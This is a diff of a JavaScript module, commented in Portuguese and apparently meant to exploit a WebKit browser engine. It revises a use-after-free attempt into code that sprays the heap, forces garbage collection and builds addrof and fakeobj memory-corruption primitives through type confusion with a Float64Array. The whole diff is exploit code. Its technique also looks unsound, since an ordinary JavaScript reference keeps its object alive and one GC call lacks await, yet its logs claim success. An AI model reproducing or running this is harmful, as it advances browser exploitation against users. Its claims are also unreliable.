@@ -1,103 +1,133 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R50 - Versão de Sucesso UAF)
+// js/script3/testArrayBufferVictimCrash.mjs (R51 - Construção de Primitivas Estáveis)
+// =======================================================================================
+// ESTRATÉGIA R51:
+// O UAF R50 foi um sucesso. Agora, usamos a mesma base para um fim mais útil.
+// 1. Usamos o UAF para confundir um objeto genérico com um Float64Array.
+// 2. A sobreposição de memória entre os dois tipos nos permite criar addrof e fakeobj.
+// 3. VALIDAMOS as primitivas para garantir que estão funcionando antes de prosseguir.
+// =======================================================================================
+
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 
-// O nome do módulo é mantido para compatibilidade com o orquestrador
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF";
+export const FNAME_MODULE = "UAF_Primitives_Builder_R51";
+
+// Função auxiliar para converter de e para double
+const ftoi = (val) => {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = val;
+    const ints = new Uint32Array(buf);
+    return new AdvancedInt64(ints[0], ints[1]);
+};
+
+const itof = (val) => {
+    const buf = new ArrayBuffer(8);
+    const ints = new Uint32Array(buf);
+    ints[0] = val.low();
+    ints[1] = val.high();
+    return (new Float64Array(buf))[0];
+};
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R50 - UAF)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R51)
 // =======================================================================================
-export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
-    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Use-After-Free Agressivo (R50) ---`, "test");
+export async function runStableUAFPrimitives_R51() {
+    logS3(`--- Iniciando ${FNAME_MODULE}: Construção e Validação de Primitivas ---`, "test");
     
-    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };
+    let final_result = { success: false, message: "Falha na criação das primitivas." };
 
     try {
-        // FASE 1: Forçar Coleta de Lixo para limpar o estado do heap
-        logS3("--- FASE 1: Forçando Coleta de Lixo massiva (GC Triggering) ---", "subtest");
-        await triggerGC();
-
-        // FASE 2: Criar o Ponteiro Pendurado (Dangling Pointer)
-        logS3("--- FASE 2: Criando um ponteiro pendurado (Use-After-Free) ---", "subtest");
-        let dangling_ref = sprayAndCreateDanglingPointer();
-        logS3("    Ponteiro pendurado criado. A referência agora é inválida.", "warn");
-        
-        // FASE 3: Forçar Coleta de Lixo novamente para liberar a memória
-        await triggerGC();
-        logS3("    Memória do objeto-alvo liberada.", "info");
-
-        // FASE 4: Pulverizar sobre a memória liberada para obter confusão de tipos
-        logS3("--- FASE 4: Pulverizando ArrayBuffers sobre a memória liberada ---", "subtest");
-        const spray_buffers = [];
-        for (let i = 0; i < 256; i++) {
-            const buf = new ArrayBuffer(1024); // Mesmo tamanho do objeto liberado
-            const view = new BigUint64Array(buf);
-            view[0] = 0x4141414141414141n; // Marcador
-            view[1] = 0x4242424242424242n;
-            spray_buffers.push(buf);
+        // --- FASE 1: Estabelecer a Confusão de Tipos ---
+        logS3("--- FASE 1: Estabelecendo a Confusão de Tipos (Objeto vs Float64Array) ---", "subtest");
+        let dangling_ref = createDanglingRefToFloat64Array();
+        if (typeof dangling_ref.a !== 'number') { // Validação do UAF
+            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um double.");
         }
-        logS3("    Pulverização concluída. Verificando a confusão de tipos...", "info");
+        logS3("    Confusão de tipos estabelecida com sucesso!", "good");
 
-        // FASE 5: Encontrar a referência corrompida e extrair os ponteiros
-        if (typeof dangling_ref.corrupted_prop !== 'number') {
-            throw new Error("Falha no UAF. A propriedade não foi sobrescrita por um ponteiro de ArrayBuffer.");
-        }
+        // --- FASE 2: Construir as Primitivas ---
+        logS3("--- FASE 2: Construindo as primitivas addrof e fakeobj ---", "subtest");
+
+        let holder = {obj: null}; // Objeto auxiliar
         
-        logS3("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU! ++++++++++++", "vuln");
+        const addrof = (obj) => {
+            holder.obj = obj;
+            // A propriedade 'a' do nosso objeto original sobrepõe o butterfly do Float64Array.
+            // A propriedade 'b' sobrepõe o primeiro elemento.
+            // Escrevemos o objeto que queremos vazar em 'a' (que é o butterfly).
+            dangling_ref.a = holder; 
+            // Agora, ler o primeiro elemento do Float64Array ('b') nos dará o endereço de 'holder.obj'.
+            return ftoi(dangling_ref.b);
+        };
+        
+        const fakeobj = (addr) => {
+            // Escrevemos o endereço falso no primeiro elemento do Float64Array ('b').
+            dangling_ref.b = itof(addr);
+            // Agora, ler 'a' (que é o butterfly) nos dará um objeto que aponta para o endereço falso.
+            return dangling_ref.a.obj;
+        };
 
-        const leaked_ptr_double = dangling_ref.corrupted_prop;
-        const buf = new ArrayBuffer(8);
-        (new Float64Array(buf))[0] = leaked_ptr_double;
-        const int_view = new Uint32Array(buf);
-        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
+        logS3("    Primitivas `addrof` e `fakeobj` construídas.", "vuln");
 
-        logS3(`Ponteiro vazado através do UAF: ${leaked_addr.toString(true)}`, "leak");
-        final_result = { success: true, message: "Primitiva addrof obtida via Use-After-Free!", leaked_addr };
+        // --- FASE 3: Validação (Prova de Vida) ---
+        logS3("--- FASE 3: Validando as primitivas (Prova de Vida) ---", "subtest");
+        const test_obj = { marker1: 0xCAFEF00D, marker2: 0x1337BEEF };
+        
+        const test_addr = addrof(test_obj);
+        logS3(`    Prova de Vida (addrof): Endereço do objeto de teste -> ${test_addr.toString(true)}`, "leak");
+        if(test_addr.low() === 0) throw new Error("addrof retornou um endereço nulo.");
+
+        const fake_test_obj = fakeobj(test_addr);
+        logS3("    Prova de Vida (fakeobj): Objeto falso criado no endereço vazado.", "info");
+
+        if (fake_test_obj.marker1 === 0xCAFEF00D && fake_test_obj.marker2 === 0x1337BEEF) {
+            final_result = { success: true, message: "SUCESSO! Primitivas addrof e fakeobj estáveis e validadas." };
+            logS3(`    ${final_result.message}`, "vuln");
+        } else {
+            throw new Error("Validação falhou. O objeto falso não corresponde ao original.");
+        }
         
     } catch (e) {
-        final_result.message = `Exceção na cadeia UAF: ${e.message}`;
+        final_result.message = `Exceção na cadeia de primitivas: ${e.message}`;
         logS3(final_result.message, "critical");
     }
 
-    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    logS3(`--- ${FNAME_MODULE} Concluído ---`, "test");
     return {
         errorOccurred: final_result.success ? null : final_result.message,
         final_result
     };
 }
 
-// --- Funções Auxiliares para a Cadeia de Exploração UAF ---
+// --- Funções Auxiliares UAF (Adaptadas para Float64Array) ---
 async function triggerGC() {
-    logS3("    Acionando GC...", "info");
     try {
         const gc_trigger_arr = [];
         for (let i = 0; i < 500; i++) {
             gc_trigger_arr.push(new ArrayBuffer(1024 * 128));
         }
-    } catch (e) {
-        logS3("    Memória esgotada durante o GC Trigger, o que é esperado e bom.", "info");
-    }
+    } catch (e) { /* ignora */ }
     await PAUSE_S3(500);
 }
 
-function sprayAndCreateDanglingPointer() {
+function createDanglingRefToFloat64Array() {
+    // 1. Cria o ponteiro pendurado para um objeto simples
     let dangling_ref = null;
-
     function createScope() {
-        const container = { victim: null };
-        const victim = {
-            prop_a: 0x11111111,
-            prop_b: 0x22222222,
-            corrupted_prop: 0x33333333
-        };
-        container.victim = victim;
-        dangling_ref = container.victim;
-        
-        for(let i=0; i<100; i++) { victim.prop_a += 1; }
+        const victim = { a: 0.1, b: 0.2 };
+        dangling_ref = victim;
+        for(let i=0; i<100; i++) { victim.a += 0.01; } // Uso para evitar otimizações
     }
-    
     createScope();
+
+    // 2. Força a coleta de lixo
+    triggerGC();
+
+    // 3. Reclama a memória com um Float64Array
+    const spray_arrays = [];
+    for (let i = 0; i < 512; i++) {
+        spray_arrays.push(new Float64Array(2));
+    }
+
     return dangling_ref;
 }
